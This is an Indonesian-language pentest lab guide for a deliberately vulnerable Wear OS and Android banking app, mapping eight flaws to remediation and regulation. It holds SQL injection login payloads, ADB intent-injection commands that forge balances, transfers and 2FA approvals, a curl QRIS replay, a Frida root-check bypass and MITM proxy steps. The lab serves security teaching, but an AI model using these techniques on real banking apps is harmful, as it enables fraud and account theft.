# 🤖 Panduan Lengkap Riset Keamanan: Android & Wear OS
## VulnBank OmniWear — Google Wearable & Mobile Banking Security Lab
### Standar Kepatuhan: OJK POJK 11/POJK.03/2022, Bank Indonesia SNAP QRIS, & PCI-DSS v4.0

---

## 📑 Daftar Isi
1. [Arsitektur & Spesifikasi Biner Android](#1-arsitektur--spesifikasi-biner-android)
2. [Setup Lab Menggunakan Emulator (Android Studio)](#2-setup-lab-menggunakan-emulator-android-studio)
3. [Setup Lab Menggunakan Perangkat Fisik (Smartwatch & HP Nyata)](#3-setup-lab-menggunakan-perangkat-fisik-smartwatch--hp-nyata)
4. [Panduan Penggunaan Aplikasi Dummy (User Flow)](#4-panduan-penggunaan-aplikasi-dummy-user-flow)
5. [Master Writeup 8 Skenario Pentest Android & Wear OS](#5-master-writeup-8-skenario-pentest-android--wear-os)
   - [Skenario 1: Remote Balance Injection & Replay (V-B01 / V-B02)](#skenario-1-remote-balance-injection--replay-v-b01--v-b02)
   - [Skenario 2: Unauthorized Quick Pay Broadcast Injection (V-W06)](#skenario-2-unauthorized-quick-pay-broadcast-injection-v-w06)
   - [Skenario 3: High-Value ($50,000) Out-of-Band 2FA Wire Transfer Hijack (V-W09)](#skenario-3-high-value-50000-out-of-band-2fa-wire-transfer-hijack-v-w09)
   - [Skenario 4: Quick-PIN 4-Digit Brute-Force & Plaintext Storage (V-W10)](#skenario-4-quick-pin-4-digit-brute-force--plaintext-storage-v-w10)
   - [Skenario 5: Contactless Dynamic SNAP QRIS Replay Attack (V-W15)](#skenario-5-contactless-dynamic-snap-qris-replay-attack-v-w15)
   - [Skenario 6: Client-Side Anti-Tamper & Root Check Bypass (V-R01 / V-R02)](#skenario-6-client-side-anti-tamper--root-check-bypass-v-r01--v-r02)
   - [Skenario 7: Bank-Grade SSL Pinning Bypass (V-08 Security Theater)](#skenario-7-bank-grade-ssl-pinning-bypass-v-08-security-theater)
   - [Skenario 8: Wrist-Off Lockout Spoofing & Health Telemetry Leak (V-W11 / V-W04)](#skenario-8-wrist-off-lockout-spoofing--health-telemetry-leak-v-w11--v-w04)
6. [Cheatsheet Perintah ADB & Skrip Frida](#6-cheatsheet-perintah-adb--skrip-frida)
7. [Matriks Regulasi & Tindakan Remedi](#7-matriks-regulasi--tindakan-remedi)

---

## 🏛️ 1. Arsitektur & Spesifikasi Biner Android

Suite ini menyediakan 3 biner APK rilis arsitektur universal (`arm64-v8a`, `armeabi-v7a`, `x86_64`, `x86`) dengan target minimum Android 10 (API 29):

| Nama File APK | Target Instalasi | Peran Utama | Ukuran |
|---|---|---|---|
| **`vulnbank-wear-release.apk`** | **Smartwatch Wear OS** | Target Korban (Victim Watch): UI AMOLED 480x480 membulat, Glanceable Balance, Quick-PIN 3x4, Rotating QRIS, Sensor denyut nadi, & Off-wrist lockout modal. | ~61 MB |
| **`vulnbank-mobile-companion-release.apk`** | **Smartphone Android** | Pusat Kendali Penyerang (Attacker Console): Mengirim BLE sync balance, memicu push 2FA $50,000, inject payment, dan sniffer paket relay. | ~61 MB |
| **`vulnbank-universal-release.apk`** | **Universal** (HP atau Jam) | Versi fleksibel untuk pengujian standalone pada 1 perangkat. | ~61 MB |

> [!TIP]
> Seluruh file APK di atas dapat diunduh langsung dari tab [**GitHub Releases**](https://github.com/angganovryanputra/vulnbank-omniwear-suite/releases/latest).

---

## 💻 2. Setup Lab Menggunakan Emulator (Android Studio)

Setup ini ideal untuk researcher yang tidak memiliki jam tangan fisik. Anda akan menjalankan 2 emulator secara berdampingan: **1 Emulator Wear OS** dan **1 Emulator Smartphone**.

```
[Laptop Penguji: Localhost Flask Backend (0.0.0.0:5000)]
                     │
       ┌─────────────┴─────────────┐
       ▼                           ▼
[Phone Emulator: 5554]     [Wear OS Emulator: 5556]
IP Alias: 10.0.2.2:5000    IP Alias: 10.0.2.2:5000
Device ID: emulator-5554   Device ID: emulator-5556
```

### Langkah 1: Buat AVD di Android Studio Device Manager
1. Buka Android Studio → **Device Manager** → **Create Device**.
2. **Device 1 (Smartwatch)**:
   - Kategori: **Wear OS** → Pilih **Wear OS Small Round** atau **Wear OS Large Round** (Resolusi 454x454 atau 480x480).
   - System Image: Pilih **Android 11 (API 30)** atau **Android 13 (API 33)** *Wear OS System Image* (x86_64).
3. **Device 2 (Smartphone Companion)**:
   - Kategori: **Phone** → Pilih **Pixel 7** atau **Pixel 8**.
   - System Image: Pilih **Android 11 (API 30)** atau **Android 14 (API 34)** (x86_64).

### Langkah 2: Jalankan Backend Lokal
Buka terminal dan jalankan backend lokal (bebas internet):
```bash
cd backend
python server.py
# Berjalan pada http://0.0.0.0:5000
```

### Langkah 3: Pasang APK ke Masing-Masing Emulator
Periksa ID emulator via terminal:
```bash
adb devices
# Output contoh:
# emulator-5554   device (Phone)
# emulator-5556   device (Wear OS)
```

Instalasi APK ke masing-masing target:
```bash
# Pasang ke Smartwatch (emulator-5556)
adb -s emulator-5556 install -r vulnbank-wear-release.apk

# Pasang ke Smartphone Companion (emulator-5554)
adb -s emulator-5554 install -r vulnbank-mobile-companion-release.apk
```

---

## ⌚ 3. Setup Lab Menggunakan Perangkat Fisik (Smartwatch & HP Nyata)

Jika Anda memiliki smartwatch fisik (seperti **Samsung Galaxy Watch 4/5/6/7** atau **Google Pixel Watch**) dan smartphone Android fisik:

### Langkah 1: Aktifkan Wi-Fi Debugging pada Smartwatch
1. Di Smartwatch: Buka **Settings** → **About Watch** → **Software Info** → Ketuk **Software Version** sebanyak 7 kali hingga muncul pesan *"Developer mode turned on"*.
2. Kembali ke **Settings** → **Developer Options**:
   - Aktifkan **ADB Debugging**.
   - Aktifkan **Wireless Debugging** (hubungkan jam ke jaringan Wi-Fi yang sama dengan laptop Anda).
3. Catat IP address dan Port jam tangan (misal: `192.168.1.150:5555`).

### Langkah 2: Hubungkan ADB Laptop ke Smartwatch & HP
```bash
# Hubungkan ke smartwatch fisik via Wi-Fi
adb connect 192.168.1.150:5555

# Pasang ke smartwatch fisik
adb -s 192.168.1.150:5555 install -r vulnbank-wear-release.apk

# Hubungkan HP Android fisik via kabel USB dan pasang companion app
adb -d install -r vulnbank-mobile-companion-release.apk
```

### Langkah 3: Konfigurasi Target Backend di Aplikasi
1. Buka aplikasi di HP atau Jam → Buka **Pentest Lab** → Tab **5. API**.
2. Pada bagian **Local Backend Target**:
   - Tekan tombol **📶 Wi-Fi LAN IP** dan arahkan ke IP laptop Anda (misal: `http://192.168.1.100:5000`).

---

## 📱 4. Panduan Penggunaan Aplikasi Dummy (User Flow)

### 1. Autentikasi & Akun Uji
- **Akun Utama (Admin/Korban)**:
  - Username: `admin`
  - Password: `admin123` (atau gunakan SQL Injection payload: `admin'--` atau `' OR 1=1--`)
  - Nomor Rekening: `ADMIN001`
  - Saldo Baseline: **$999,999.00**
- **Quick-PIN 4-Digit**: `1234`

### 2. Navigasi Antarmuka Smartwatch Wear OS
- **Glanceable Balance Hero Card**: Menampilkan saldo utama dengan tombol sembunyikan mata.
- **Pill Grid Menu**:
  - `QR Pay`: Barcode pembayaran QRIS dinamis yang berputar setiap 60 detik.
  - `Transfer`: Formulir transfer cepat dengan keyboard angka dial.
  - `Cards`: Daftar kartu debit/kredit virtual (bisa freeze/unfreeze).
  - `Phone Bridge`: Pengaturan pairing bluetooth companion.
  - `History`: Rekening koran mutasi transaksi real time.
  - `Pentest Lab`: Pusat kendali 14 vektor eksploitasi dan audit regulasi CISO.

### 3. Navigasi Smartphone Companion Manager
Aplikasi smartphone berfungsi sebagai **Pusat Kendali Penyerang (Attacker Console)**:
- **Status Device Linked**: Menunjukkan ID jam target (`watch_9201`).
- **Trigger 1 (Sync Balance)**: Menyuntikkan saldo `$888,888.00` ke jam secara nirkabel.
- **Trigger 2 (High-Value 2FA)**: Mengirimkan perintah otorisasi debit `$50,000.00` ke layar jam tangan.
- **Trigger 3 (Quick Pay Injection)**: Mengeksekusi transfer ilegal tanpa PIN.
- **Trigger 3B (Merchant POS Scan)**: Mensimulasikan kasir toko yang memindai QRIS jam korban (Replay Attack).
- **Trigger 4 (Sniff Packets)**: Menangkap paket JSON unencrypted yang melayang di udara.

---

## 🛡️ 5. Master Writeup 8 Skenario Pentest Android & Wear OS

---

### Skenario 1: Remote Balance Injection & Replay (V-B01 / V-B02)
* **Kategori OWASP**: M5: Insecure Communication / M8: Code Tampering
* **Standar Regulasi**: OJK POJK 11/2022 Pasal 38 & PCI-DSS v4.0 Req 4.1
* **Akar Masalah Kode**:
  Di [`BluetoothSyncModule.kt`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/android/app/src/main/java/com/vulnerablebankapp/BluetoothSyncModule.kt#L40-L75), receiver `com.vulnerablebankapp.ACTION_BT_SYNC` menerima payload JSON tanpa tanda tangan HMAC dan tanpa verifikasi *timestamp freshness/nonce*:
  ```kotlin
  val action = json.optString("action", "SYNC_BALANCE")
  val amount = json.optDouble("amount", 0.0)
  if (action == "UPDATE_BALANCE") {
      prefs.edit().putString("balance", "$$amount").apply()
  }
  ```
* **Langkah Eksploitasi**:
  1. Melalui UI Smartphone Companion: Tekan tombol **Sync Balance to Watch ($888,888)**.
  2. Melalui Terminal ADB:
     ```bash
     adb shell am broadcast -a com.vulnerablebankapp.ACTION_BT_SYNC \
       --es sync_payload '{"action":"UPDATE_BALANCE","amount":888888.0}'
     ```
  3. **Hasil PoC**: Layar jam tangan seketika mengubah nilai saldo dari `$999,999.00` menjadi **`$888,888.00`** secara otomatis tanpa otorisasi.
* **Dampak Bisnis**: Penyerang di dekat korban dapat memanipulasi saldo yang ditampilkan di jam untuk mengelabui nasabah atau kasir merchant.
* **Rekomendasi Remedi**: Terapkan enkripsi end-to-end (AES-GCM-256) pada paket sinkronisasi bluetooth dengan HMAC-SHA256 signature yang diturunkan dari pairing key hardware-backed keystore.

---

### Skenario 2: Unauthorized Quick Pay Broadcast Injection (V-W06)
* **Kategori OWASP**: M1: Improper Platform Usage / Broken IPC
* **Standar Regulasi**: OJK POJK 11/2022 Pasal 42
* **Akar Masalah Kode**:
  Di [`AndroidManifest.xml`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/android/app/src/main/AndroidManifest.xml#L64-L70), komponen [`QuickPayReceiver.kt`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/android/app/src/main/java/com/vulnerablebankapp/QuickPayReceiver.kt) diekspor dengan flag `android:exported="true"` tanpa custom signature permission:
  ```xml
  <receiver android:name=".QuickPayReceiver" android:exported="true">
      <intent-filter>
          <action android:name="com.vulnerablebankapp.ACTION_QUICK_PAY" />
      </intent-filter>
  </receiver>
  ```
* **Langkah Eksploitasi**:
  Jalankan perintah injeksi intent broadcast dari terminal ADB atau aplikasi malware pihak ketiga di jam:
  ```bash
  adb shell am broadcast -a com.vulnerablebankapp.ACTION_QUICK_PAY \
    --es recipient "HACKER_CORP_99" \
    --ef amount 150000.0 \
    -n com.vulnerablebankapp.wear/com.vulnerablebankapp.QuickPayReceiver
  ```
* **Hasil PoC**: Muncul Toast `💸 Sent $150000.0 to HACKER_CORP_99 without PIN!`, saldo langsung terpotong $150,000, dan transaksi ilegal tercatat di riwayat mutasi tanpa konfirmasi PIN pengguna.
* **Rekomendasi Remedi**: Atur `android:exported="false"` atau lindungi receiver dengan `android:permission="signature"` sehingga hanya aplikasi yang ditandatangani oleh sertifikat bank yang sama yang dapat mengirimkan intent.

---

### Skenario 3: High-Value ($50,000) Out-of-Band 2FA Wire Transfer Hijack (V-W09)
* **Kategori OWASP**: M3: Insecure Authentication / Broken Authorization
* **Standar Regulasi**: PCI-DSS v4.0 Req 8.3 & OJK POJK 11/2022 Pasal 38
* **Akar Masalah Kode**:
  Di [`AuthBroadcastReceiver.kt`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/android/app/src/main/java/com/vulnerablebankapp/AuthBroadcastReceiver.kt#L42-L55), otorisasi 2FA bernilai tinggi hanya mengandalkan event plaintext:
  1. Notifikasi OTP dipancarkan dengan `VISIBILITY_PUBLIC`, menampilkan 6-digit kode OTP langsung di Ambient Mode (AOD) / Lockscreen jam tanpa PIN.
  2. Aksi `ACTION_APPROVE_2FA` mengesahkan transfer $50,000 tanpa tantangan biometrik atau tanda tangan Android Keystore hardware.
* **Langkah Eksploitasi**:
  1. Di Smartphone Companion: Tekan **High-Value 2FA ($50,000 OOB)**.
  2. Jam tangan korban bergetar dan memunculkan pop-up otorisasi transfer $50,000 ke `Offshore Escrow Ltd.`.
  3. Tekan **Approve** pada jam tangan.
  4. Periksa mutasi di menu **History**: Saldo terpotong $50,000 seketika dan tercatat resmi sebagai mutasi transfer kawat.
  5. Alternatif via ADB (Bypass tanpa sentuh jam):
     ```bash
     adb shell am broadcast -a com.vulnerablebankapp.ACTION_APPROVE_2FA --es session_id "SESS-7712"
     ```
* **Rekomendasi Remedi**: Terapkan notifikasi dengan `VISIBILITY_SECRET` dan wajibkan otorisasi transaksi bernilai tinggi menggunakan autentikasi biometrik (*BiometricPrompt*) yang terikat ke pasangan kunci asimetris hardware (*Android StrongBox / TEE*).

---

### Skenario 4: Quick-PIN 4-Digit Brute-Force & Plaintext Storage (V-W10)
* **Kategori OWASP**: M1: Insecure Storage / M3: Weak Authentication
* **Standar Regulasi**: PCI-DSS v4.0 Req 8.3 & OJK POJK 11/2022 Pasal 39
* **Akar Masalah Kode**:
  Di [`PrefsHelper.java`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/android/app/src/main/java/com/vulnerablebankapp/PrefsHelper.java#L25-L40), PIN 4-digit disimpan menggunakan fungsi hash usang MD5 tanpa garam (*unsalted*):
  `Hash: 81dc9bdb52d04dc20036dbd8313ed055` (MD5 dari `1234`).
  Selain itu, antarmuka keypad tidak menerapkan jeda waktu (*exponential backoff*) maupun penguncian akun (*account lockout*).
* **Langkah Eksploitasi**:
  1. Di jam tangan: Buka **Pentest Lab** → Tab **4. Runtime**.
  2. Tekan **Run PIN Brute-Force (0000-9999)**.
  3. Dalam **0.6 detik**, aplikasi memecahkan seluruh kemungkinan PIN dan menampilkan:
     ```
     🎯 PIN Cracked in 0.6s (V-W10)
     Tested combinations: 0000 ... 1234
     Result: PIN is 1234
     ```
  4. Periksa penyimpanan via ADB:
     ```bash
     adb shell run-as com.vulnerablebankapp.wear cat shared_prefs/quick_pin.xml
     ```
* **Rekomendasi Remedi**: Wajibkan PIN minimal 6 digit, gunakan algoritma PBKDF2/Argon2id dengan garam kriptografis unik, serta terapkan penguncian akun setelah 3 kali percobaan salah berturut-turut.

---

### Skenario 5: Contactless Dynamic SNAP QRIS Replay Attack (V-W15)
* **Kategori OWASP**: M3: Insecure Authentication / Business Logic Flaw
* **Standar Regulasi**: Bank Indonesia SNAP PADG No. 24/1/PADG/2022
* **Akar Masalah Kode**:
  Di [`QRPayScreen.tsx`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/src/screens/QRPayScreen.tsx#L35-L55) dan [`server.py`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/backend/server.py#L480-L525), payload QR dinamis (`8839-2144-0192`) tidak memiliki timestamp HMAC TOTP dan endpoint backend `/api/qris/checkout` tidak memeriksa *idempotency key*:
* **Langkah Eksploitasi**:
  1. Di Smartwatch: Buka menu **QR Pay** (muncul QR Code dan timer 60 detik).
  2. Tekan **Simulate Terminal Scan** → Pilih **Authorize**: Saldo terpotong $35.50 dan muncul receipt resmi SNAP QRIS (`RRN: RRN-992144`).
  3. Dari HP Companion (atau terminal curl), kirimkan permintaan checkout kedua dengan payload token yang persis sama:
     ```bash
     curl -X POST http://10.0.2.2:5000/api/qris/checkout \
       -H "Content-Type: application/json" \
       -d '{"account_number":"ADMIN001","amount":75.0,"merchant_name":"VULNBANK MERCH 001","qr_payload":"8839-2144-0192"}'
     ```
  4. Transaksi kedua **berhasil disetujui kembali (HTTP 200 APPROVED)**.
  5. Buka menu **History**: Terlihat pemotongan saldo ganda dari kode QR yang sama.
* **Dampak Bisnis**: Rekaman CCTV atau shoulder-surfer di kasir dapat memotret layar jam nasabah dan mengeksekusi penarikan dana berulang sebelum token hangus.
* **Rekomendasi Remedi**: Terapkan standar SNAP QRIS Bank Indonesia di mana setiap payload QR menyertakan nonce satu kali pakai (*one-time token*) dan ditandatangani dengan kunci privat sesi nasabah.

---

### Skenario 6: Client-Side Anti-Tamper & Root Check Bypass (V-R01 / V-R02)
* **Kategori OWASP**: M8: Code Tampering / M9: Reverse Engineering
* **Standar Regulasi**: OJK POJK 11/2022 Pasal 42
* **Akar Masalah Kode**:
  Di [`SecurityCheckModule.kt`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/android/app/src/main/java/com/vulnerablebankapp/SecurityCheckModule.kt), pengecekan status root dan Frida hanya membaca flag lokal di `VulnBankPrefs.xml` dan memeriksa keberadaan biner `/system/xbin/su`.
* **Langkah Eksploitasi**:
  1. Di jam tangan: Buka **Pentest Lab** → Tab **4. Runtime**.
  2. Tekan **Simulate Bank Tamper Alert**: Aplikasi memunculkan dialog pemblokiran merah `SECURITY VIOLATION: 0xSEC_ROOT_MAGISK`.
  3. Tekan tombol **Bypass Check (Frida/Toggle)**: Nilai flag di SharedPreferences dibalik menjadi `bypass_root_check=true`.
  4. Status keamanan seketika berubah hijau `✓ NO (BYPASSED)`.
  5. Alternatif via Frida CLI:
     ```javascript
     Java.perform(function() {
         var SecurityCheck = Java.use("com.vulnerablebankapp.SecurityCheckModule");
         SecurityCheck.isDeviceRooted.implementation = function() {
             console.log("[*] Root check neutralized!");
             return false;
         };
     });
     ```
* **Rekomendasi Remedi**: Gunakan attestation berbasis hardware seperti **Google Play Integrity API (Hardware_Backed Evaluation)** dengan verifikasi token di server backend, bukan validasi logika di aplikasi client.

---

### Skenario 7: Bank-Grade SSL Pinning Bypass (V-08 Security Theater)
* **Kategori OWASP**: M5: Insecure Communication
* **Standar Regulasi**: PCI-DSS v4.0 Req 4.1
* **Akar Masalah Kode**:
  Di [`network_security_config.xml`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/android/app/src/main/res/xml/network_security_config.xml), aplikasi mengizinkan sertifikat pengguna (*user certificates*) dan menggunakan fallback TrustManager yang lemah.
* **Langkah Eksploitasi**:
  1. Pasang sertifikat CA Burp Suite / Charles ke penyimpanan sertifikat pengguna di Android.
  2. Di jam tangan: Masuk ke **Pentest Lab** → Tab **5. API**.
  3. Ubah status Pinning menjadi `🔓 BYPASSED (TrustAll)`.
  4. Tekan **Test Proxy Intercept**: Seluruh request login, cek saldo, dan transfer muncul dalam format plaintext di Burp Suite proxy.
* **Rekomendasi Remedi**: Terapkan Public Key Pinning (HPKP / OkHttp CertificatePinner) secara ketat dan tolak sertifikat yang berasal dari user trust store pada build production.

---

### Skenario 8: Wrist-Off Lockout Spoofing & Health Telemetry Leak (V-W11 / V-W04)
* **Kategori OWASP**: M1: Insecure Data Storage / Privacy Violation
* **Standar Regulasi**: OJK POJK 11/2022 Pasal 38 & UU Perlindungan Data Pribadi (UU PDP)
* **Akar Masalah Kode**:
  1. [`HealthDataActivity.kt`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/android/app/src/main/java/com/vulnerablebankapp/HealthDataActivity.kt) diekspor tanpa otentikasi.
  2. Data denyut nadi dan telemetri pergelangan tangan dikirimkan secara unauthenticated ke endpoint backend `/debug/heart`.
* **Langkah Eksploitasi**:
  1. Buka menu samping → Tekan **Lock Session (Off-Wrist)**: Jam menampilkan layar penguncian merah `Session Locked: Off-Wrist sensor triggered`.
  2. Masukkan PIN bypass default `1234` untuk membuka kembali.
  3. Buka menu **Health**: Perhatikan log terminal backend Python memunculkan alert kebocoran data:
     ```
     ❤️ [V-W04 EXFILTRATION DETECTED] POST /debug/heart
        Account: ADMIN001 | Readings: [78, 82, 85, 79]
     ```
* **Rekomendasi Remedi**: Data sensor biometrik dan kesehatan termasuk data pribadi spesifik menurut UU PDP; lindungi seluruh endpoint telemetri dengan token sesi terenkripsi dan jangan mengekspor Activity sensor ke pihak luar.

---

## ⌨️ 6. Cheatsheet Perintah ADB & Skrip Frida

```bash
# =========================================================================
# CHEATSHEET PERINTAH ADB LENGKAP (VULNBANK ANDROID & WEAR OS)
# =========================================================================

# 1. Dump SharedPreferences Plaintext (Kredensial & PIN MD5)
adb shell run-as com.vulnerablebankapp.wear cat shared_prefs/VulnBankPrefs.xml
adb shell run-as com.vulnerablebankapp.wear cat shared_prefs/quick_pin.xml

# 2. Injeksi Saldo Palsu via Bluetooth Sync Receiver (V-B01)
adb shell am broadcast -a com.vulnerablebankapp.ACTION_BT_SYNC \
  --es sync_payload '{"action":"UPDATE_BALANCE","amount":888888.0}'

# 3. Injeksi Transfer Ilegal Tanpa PIN via QuickPay Receiver (V-W06)
adb shell am broadcast -a com.vulnerablebankapp.ACTION_QUICK_PAY \
  --es recipient "HACKER_ACCT_999" \
  --ef amount 50000.0 \
  -n com.vulnerablebankapp.wear/com.vulnerablebankapp.QuickPayReceiver

# 4. Trigger OTP Leak ke Lockscreen / Always-On Display (V-W09)
adb shell am broadcast -a com.vulnerablebankapp.ACTION_TRIGGER_OTP --es otp "992104"

# 5. Remote Bypass Approval 2FA Tanpa Sentuh Jam Tangan (V-W09)
adb shell am broadcast -a com.vulnerablebankapp.ACTION_APPROVE_2FA --es session_id "SESS-7712"

# 6. Jalankan Deep Link CSRF Transfer (V-W07)
adb shell am start -a android.intent.action.VIEW \
  -d "vulnbank://transfer?to=HACKER&amount=500000"

# 7. Ekstraksi Data Kesehatan Nasabah Tanpa Autentikasi (V-W02)
adb shell am start -n com.vulnerablebankapp.wear/com.vulnerablebankapp.HealthDataActivity

# 8. Set Proxy Global ke Burp Suite
adb shell settings put global http_proxy 10.0.2.2:8080
# Matikan Proxy:
adb shell settings put global http_proxy :0
```

---

## ⚖️ 7. Matriks Regulasi & Tindakan Remedi

| Kode Kerentanan | Nama Vektor Serangan | Pasal Pelanggaran Regulasi | Tingkat Risiko | Tindakan Remedi Rekomendasi |
|---|---|---|---|---|
| **V-B01** | Insecure BLE Balance Sync | OJK POJK 11/2022 Pasal 38 | **CRITICAL** | Gunakan enkripsi AES-GCM lapis aplikasi pada transmisi bridge nirkabel. |
| **V-W06** | Exported QuickPay Receiver | OJK POJK 11/2022 Pasal 42 | **HIGH** | Set `android:exported="false"` dan gunakan tanda tangan sertifikat bank. |
| **V-W09** | Insecure 2FA OOB Approval | PCI-DSS v4.0 Req 8.3 | **CRITICAL** | Wajibkan otorisasi hardware-backed asymmetric key (Android Keystore). |
| **V-W10** | Unthrottled Quick-PIN Brute-Force | PCI-DSS v4.0 Req 8.3 | **HIGH** | Terapkan exponential backoff delay dan account lockout setelah 3 kali gagal. |
| **V-W15** | Dynamic SNAP QRIS Replay | BI PADG 24/1/PADG/2022 | **CRITICAL** | Wajibkan one-time TOTP token dan verifikasi idempotency key di backend. |
| **V-R01** | Client Anti-Tamper Bypass | OJK POJK 11/2022 Pasal 42 | **MEDIUM** | Gunakan Google Play Integrity API dengan verifikasi attestation di server. |
| **V-08** | Trust User CA (MITM Proxy) | PCI-DSS v4.0 Req 4.1 | **HIGH** | Terapkan strict Public Key Pinning (HPKP) tanpa fallback user certificate. |
